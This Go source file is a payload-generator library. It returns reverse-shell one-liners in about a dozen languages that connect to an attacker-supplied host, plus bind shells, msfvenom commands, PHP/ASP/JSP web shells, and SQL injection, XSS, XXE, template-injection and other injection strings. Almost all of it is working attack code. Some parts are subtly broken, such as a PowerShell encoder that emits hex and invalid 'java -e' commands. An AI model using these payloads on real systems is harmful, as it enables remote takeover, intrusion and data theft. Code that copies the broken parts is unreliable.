package payloads

import (
	"fmt"
	"strings"
)

func ReverseShellPayload(protocol, lhost, lport string) string {
	switch strings.ToLower(protocol) {
	case "bash":
		return fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	case "python":
		return fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, lhost, lport)
	case "php":
		return fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, lhost, lport)
	case "perl":
		return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, lhost, lport)
	case "ruby":
		return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, lhost, lport)
	case "netcat":
		return fmt.Sprintf("nc -e /bin/sh %s %s", lhost, lport)
	case "socat":
		return fmt.Sprintf("socat TCP:%s:%s EXEC:bash,pty,stderr,setsid,sigint,sane", lhost, lport)
	case "java":
		return fmt.Sprintf(`java -cp . -e 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/%s/%s 0>&1"})'`, lhost, lport)
	case "node":
		return fmt.Sprintf(`node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%s,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`, lport, lhost)
	case "powershell":
		psCmd := "$c=New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
		return fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Enc %s`, encodePowerShell(psCmd))
	case "awk":
		return fmt.Sprintf(`awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`, lhost, lport)
	case "lua":
		return fmt.Sprintf(`lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');"`, lhost, lport)
	case "groovy":
		return fmt.Sprintf(`groovy -e 'Socket s=new Socket("%s",%s);def p=["/bin/sh","-i"].execute();p.waitForProcessOutput(s.inputStream,s.outputStream,s.errorStream)'`, lhost, lport)
	default:
		return ""
	}
}

func BindShellPayload(protocol, lport string) string {
	switch strings.ToLower(protocol) {
	case "netcat":
		return fmt.Sprintf("nc -l -p %s -e /bin/sh", lport)
	case "bash":
		return fmt.Sprintf(`bash -c 'cat /dev/null > /dev/tcp/0.0.0.0/%s && while true; do (echo -e "HTTP/1.0 200 OK\r\n\r\n$(/bin/sh -i 2>&1)") | nc -l -p %s; done'`, lport, lport)
	case "python":
		return fmt.Sprintf(`python -c 'import socket,subprocess,os,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",%s));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, lport)
	case "php":
		return fmt.Sprintf(`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",%s);socket_listen($s);$c=socket_accept($s);exec("/bin/sh -i <&".socket_export($c)." >&".socket_export($c)." 2>&".socket_export($c));'`, lport)
	case "perl":
		return fmt.Sprintf(`perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(%s,INADDR_ANY));listen(S,3);while(1){accept(C,S);if(!fork){open(STDIN,"<&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");close C;}}'`, lport)
	case "ruby":
		return fmt.Sprintf(`ruby -rsocket -e 's=TCPServer.new(%s);while c=s.accept;fork do exec "/bin/sh -i <&#{c.fileno} >&#{c.fileno} 2>&#{c.fileno}"; end;end'`, lport)
	case "socat":
		return fmt.Sprintf("socat TCP-LISTEN:%s,fork EXEC:bash,pty,stderr,setsid,sigint,sane", lport)
	case "powershell":
		return fmt.Sprintf(`$l=New-Object System.Net.Sockets.TcpListener("0.0.0.0",%s);$l.Start();while($c=$l.AcceptTcpClient()){$s=$c.GetStream();$b=New-Object System.IO.StreamReader($s);$w=New-Object System.IO.StreamWriter($s);$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName="cmd.exe";$p.StartInfo.RedirectStandardInput=$true;$p.StartInfo.RedirectStandardOutput=$true;$p.StartInfo.RedirectStandardError=$true;$p.StartInfo.UseShellExecute=$false;$p.StartInfo.CreateNoWindow=$true;$p.Start();$r=New-Object System.Threading.ManualResetEvent($false);while($s.DataAvailable){$o=$b.ReadLine();$p.StandardInput.WriteLine($o)};while(!$p.HasExited){if($s.DataAvailable){$o=$b.ReadLine();$p.StandardInput.WriteLine($o)};while(!$s.DataAvailable -and !$p.HasExited){Start-Sleep -Milliseconds 100};if($p.StandardOutput.Peek() -ge 0){$w.WriteLine($p.StandardOutput.ReadLine());$r.Set()}};$c.Close()}`, lport)
	case "java":
		return fmt.Sprintf(`java -cp . -e 'java.net.ServerSocket ss=new java.net.ServerSocket(%s);while(true){java.net.Socket s=ss.accept();Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/0.0.0.0/%s 0>&1"});}'`, lport, lport)
	case "node":
		return fmt.Sprintf(`node -e 'require("net").createServer(function(s){require("child_process").exec("/bin/sh",function(e,i,o){s.pipe(i);i.pipe(s)})}).listen(%s)'`, lport)
	default:
		return ""
	}
}

func MeterpreterPayload(protocol, lhost, lport, format string) string {
	ext := "exe"
	switch strings.ToLower(format) {
	case "elf":
		ext = "elf"
	case "asp":
		ext = "asp"
	case "aspx":
		ext = "aspx"
	case "jsp":
		ext = "jsp"
	case "war":
		ext = "war"
	case "raw":
		ext = "raw"
	}

	payload := ""
	switch strings.ToLower(protocol) {
	case "tcp":
		payload = fmt.Sprintf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s", lhost, lport, ext)
	case "http":
		payload = fmt.Sprintf("msfvenom -p windows/meterpreter/reverse_http LHOST=%s LPORT=%s -f %s", lhost, lport, ext)
	case "https":
		payload = fmt.Sprintf("msfvenom -p windows/meterpreter/reverse_https LHOST=%s LPORT=%s -f %s", lhost, lport, ext)
	case "tcp_linux":
		payload = fmt.Sprintf("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s", lhost, lport, ext)
	default:
		payload = fmt.Sprintf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s", lhost, lport, ext)
	}
	return payload
}

func ShellcodePayload(osName, arch, lhost, lport string) string {
	osName = strings.ToLower(osName)
	arch = strings.ToLower(arch)

	switch osName {
	case "linux":
		switch arch {
		case "x64":
			return fmt.Sprintf("msfvenom -p linux/x64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		case "x86":
			return fmt.Sprintf("msfvenom -p linux/x86/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		case "arm64":
			return fmt.Sprintf("msfvenom -p linux/arm64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		}
	case "windows":
		switch arch {
		case "x64":
			return fmt.Sprintf("msfvenom -p windows/x64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		case "x86":
			return fmt.Sprintf("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		case "arm64":
			return fmt.Sprintf("msfvenom -p windows/arm64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		}
	case "macos":
		switch arch {
		case "x64":
			return fmt.Sprintf("msfvenom -p osx/x64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		case "arm64":
			return fmt.Sprintf("msfvenom -p osx/arm64/shell/reverse_tcp LHOST=%s LPORT=%s -f raw", lhost, lport)
		}
	}
	return ""
}

func WebShellPayload(shellType, password string) string {
	switch strings.ToLower(shellType) {
	case "php":
		return fmt.Sprintf(`<?php if(isset($_POST['%s'])){system($_POST['%s']);}?>`, password, password)
	case "asp":
		return `<% Set o = Server.CreateObject("WSCRIPT.SHELL") : o.Run(Request("cmd")) : Set o = Nothing %>`
	case "jsp":
		return `<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if(cmd != null){ Process p = Runtime.getRuntime().exec(cmd); } %>`
	default:
		return ""
	}
}

func SQLInjectionPayload(db, technique string) string {
	db = strings.ToLower(db)
	technique = strings.ToLower(technique)

	switch db {
	case "mysql":
		switch technique {
		case "union":
			return "' UNION SELECT NULL,NULL,NULL-- -"
		case "error":
			return "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"
		case "blind":
			return "' AND ASCII(SUBSTRING((SELECT version()),1,1))>64-- -"
		case "time-based":
			return "' AND IF(1=1,SLEEP(5),0)-- -"
		}
	case "postgres":
		switch technique {
		case "union":
			return "' UNION SELECT NULL,NULL,NULL--"
		case "error":
			return "' AND 1=CAST((SELECT version()) AS int)--"
		case "blind":
			return "' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--"
		case "time-based":
			return "' AND 1=1;SELECT pg_sleep(5)--"
		}
	case "mssql":
		switch technique {
		case "union":
			return "' UNION SELECT NULL,NULL,NULL--"
		case "error":
			return "' AND 1=CONVERT(int,@@version)--"
		case "blind":
			return "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--"
		case "time-based":
			return "'; WAITFOR DELAY '0:0:5'--"
		}
	case "oracle":
		switch technique {
		case "union":
			return "' UNION SELECT NULL,NULL,NULL FROM dual--"
		case "error":
			return "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
		case "blind":
			return "' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>64--"
		case "time-based":
			return "' AND 1=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--"
		}
	case "sqlite":
		switch technique {
		case "union":
			return "' UNION SELECT NULL,NULL,NULL--"
		case "error":
			return "' AND 1=CAST((SELECT sqlite_version()) AS int)--"
		case "blind":
			return "' AND ASCII(SUBSTR(sqlite_version(),1,1))>64--"
		case "time-based":
			return "' AND 1=1;SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 1 END--"
		}
	}
	return ""
}

func XSSPayload(context string) string {
	switch strings.ToLower(context) {
	case "html":
		return "<script>alert('XSS')</script>"
	case "attribute":
		return "\" onmouseover=\"alert('XSS')\""
	case "javascript":
		return "alert('XSS')"
	case "css":
		return "</style><script>alert('XSS')</script>"
	case "url":
		return "javascript:alert('XSS')"
	default:
		return ""
	}
}

func XXEPayload(protocol, lhost, lport string) string {
	return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s://%s:%s">]><foo>&xxe;</foo>`, protocol, lhost, lport)
}

func SSTIPayload(engine, template string) string {
	switch strings.ToLower(engine) {
	case "twig":
		if template == "" {
			return "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
		}
		return fmt.Sprintf("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('%s')}}", template)
	case "jinja2":
		if template == "" {
			return "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"
		}
		return fmt.Sprintf("{{ config.__class__.__init__.__globals__['os'].popen('%s').read() }}", template)
	case "freemarker":
		if template == "" {
			return "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
		}
		return fmt.Sprintf("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('%s')}", template)
	case "velocity":
		if template == "" {
			return "#set($class=$context.classLoader.loadClass('java.lang.Runtime'))$class.getRuntime().exec('id')"
		}
		return fmt.Sprintf("#set($class=$context.classLoader.loadClass('java.lang.Runtime'))$class.getRuntime().exec('%s')", template)
	default:
		return ""
	}
}

func SSRFPayload(protocol, lhost, lport string) string {
	return fmt.Sprintf("%s://%s:%s", protocol, lhost, lport)
}

func LDAPInjectionPayload(direction string) string {
	switch strings.ToLower(direction) {
	case "injection":
		return "*)(objectClass=*)"
	case "blind":
		return "*)(uid=*))(|(uid=*"
	case "enumeration":
		return "*)(objectClass=user)"
	default:
		return ""
	}
}

func XPathInjectionPayload(technique string) string {
	switch strings.ToLower(technique) {
	case "union":
		return "' or '1'='1"
	case "blind":
		return "' or substring(//user[1]/pass,1,1)='a"
	case "error":
		return "' or 1=concat('a',//user[1]/pass,'b') or '1'='1"
	case "time-based":
		return "' or if(substring(//user[1]/pass,1,1)='a', sleep(5), 0) or '1'='1"
	default:
		return "' or '1'='1"
	}
}

func NoSQLInjectionPayload(operator string) string {
	switch strings.ToLower(operator) {
	case "eq":
		return `{"$ne": null}`
	case "gt":
		return `{"$gt": ""}`
	case "regex":
		return `{"$regex": ".*"}`
	case "exists":
		return `{"$exists": true}`
	default:
		return `{"$ne": null}`
	}
}

func TemplateInjectionPayload(engine string) string {
	switch strings.ToLower(engine) {
	case "twig":
		return "{{7*7}}"
	case "jinja2":
		return "{{7*7}}"
	case "freemarker":
		return "${7*7}"
	case "velocity":
		return "#set($x=7*7)$x"
	default:
		return ""
	}
}

func PathTraversalPayload(depth int) string {
	if depth <= 0 {
		depth = 5
	}
	return strings.Repeat("../", depth)
}

func CommandInjectionPayload(separator string) string {
	switch strings.ToLower(separator) {
	case "pipe":
		return "|"
	case "semicolon":
		return ";"
	case "backtick":
		return "`"
	case "dollar":
		return "$()"
	case "ampersand":
		return "&&"
	case "double":
		return "||"
	case "newline":
		return "\n"
	default:
		return ";"
	}
}

func LDAPPayload(direction string) string {
	switch strings.ToLower(direction) {
	case "search":
		return "(&(objectClass=*)(uid=*))"
	case "bind":
		return "(&(uid=*)(userPassword=*))"
	case "enumeration":
		return "(&(objectClass=user)(uid=*))"
	default:
		return "(&(objectClass=*)(uid=*))"
	}
}

func encodePowerShell(data string) string {
	encoded := make([]byte, len(data)*2)
	for i, b := range []byte(data) {
		encoded[i*2] = b
		encoded[i*2+1] = 0
	}
	return fmt.Sprintf("%x", encoded)
}
